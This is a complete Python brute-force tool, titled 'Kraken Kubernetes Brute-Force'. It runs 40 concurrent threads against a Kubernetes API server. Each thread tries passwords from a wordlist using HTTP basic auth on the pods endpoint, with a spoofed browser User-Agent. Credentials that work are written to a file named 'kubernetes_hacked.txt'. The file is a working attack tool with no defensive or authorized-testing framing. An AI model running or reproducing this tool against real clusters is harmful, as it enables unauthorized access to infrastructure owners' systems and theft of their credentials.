import os
import sys
import time
import logging
import requests
import gevent
from gevent import monkey
from gevent.pool import Pool
from random import choice
from colorama import Fore, Style, init
import pyfiglet


monkey.patch_all()


init(autoreset=True)


script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


logging.basicConfig(filename=os.path.join(logs_dir, 'kubernetes_brute_force.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken Kubernetes Brute-Force", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def get_user_input():
    """Gathers user input for the Kubernetes brute force operation."""
    api_server = input(Fore.CYAN + 'Enter the Kubernetes API server URL (e.g., https://api.example.com): ').strip()
    if not api_server.startswith(('http://', 'https://')):
        api_server = 'https://' + api_server

    username = input(Fore.CYAN + 'Enter Username: ').strip()
    if not username:
        logging.error(Fore.RED + 'Username cannot be empty!')
        sys.exit(1)

    password_file = input(Fore.CYAN + 'Enter Password List File: ').strip()
    return api_server, username, password_file

def load_passwords(password_file):
    """Loads passwords from the specified file."""
    if os.path.isfile(password_file):
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
        logging.info(f"{len(passwords)} passwords loaded.")
        return passwords
    else:
        logging.error(Fore.RED + f"Password list file not found: {password_file}")
        sys.exit(1)

def attempt_login(api_server, username, password, attempt_number, total_attempts, start_time, result_file):
    """Attempts to log in to the Kubernetes API server using provided credentials."""
    def format_output(success):
        elapsed_time = time.time() - start_time
        percentage = (attempt_number / total_attempts) * 100
        estimated_total_time = elapsed_time / (attempt_number / total_attempts)
        remaining_time = estimated_total_time - elapsed_time
        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))
        status = "Success" if success else ""
        return f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password} {status}"

    try:
        session = requests.Session()
        login_url = f'{api_server}/api/v1/namespaces/default/pods'
        response = session.get(login_url, auth=(username, password), headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)

        sys.stdout.write('\033[K')  
        if response.status_code == 200:
            success_msg = format_output(True)
            print(Style.BRIGHT + Fore.GREEN + success_msg + Style.RESET_ALL)
            logging.info(success_msg.strip())
            result_file.write(success_msg.strip() + "\n")
            result_file.flush()  
            with open(os.path.join(results_dir, 'kubernetes_hacked.txt'), 'a') as writer:
                writer.write(f'{login_url}\nUsername: {username}\nPassword: {password}\n{"-"*40}\n')
            return success_msg
        elif response.status_code == 401:
            fail_msg = format_output(False)
            print(Fore.WHITE + fail_msg, end='', flush=True)
            logging.info(f"Failed: {username}:{password}")
            return None
        else:
            logging.info(f"Unexpected status code {response.status_code} for {username}:{password}")
            return None
    except Exception as e:
        sys.stdout.write('\033[K')  
        fail_msg = format_output(False)
        print(Fore.WHITE + fail_msg, end='', flush=True)
        logging.error(f"Login attempt error: {str(e)}")
        return None

def run_bruteforce(api_server, username, passwords, threads):
    """Runs brute-force attack with gevent."""
    total_attempts = len(passwords)
    start_time = time.time()
    attempt_number = 0
    results = []
    pool = Pool(threads)

    result_file_path = os.path.join(results_dir, "kubernetes_results.txt")
    with open(result_file_path, "a") as result_file:  

        def handle_result(password):
            nonlocal attempt_number
            attempt_number += 1
            result = attempt_login(api_server, username, password, attempt_number, total_attempts, start_time, result_file)
            if result:
                results.append(result)

        for password in passwords:
            pool.spawn(handle_result, password)

        pool.join()

    logging.info("Brute force process completed.")

def main():
    clear_console()
    display_banner()

    api_server, username, password_file = get_user_input()
    passwords = load_passwords(password_file)
    threads = 40  
    print(Style.RESET_ALL + Fore.WHITE + "\n" + "="*80 + "\n")
    run_bruteforce(api_server, username, passwords, threads)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logging.info(Fore.YELLOW + "\nScript interrupted by user.")
        print(Fore.YELLOW + "\nScript interrupted by user.")
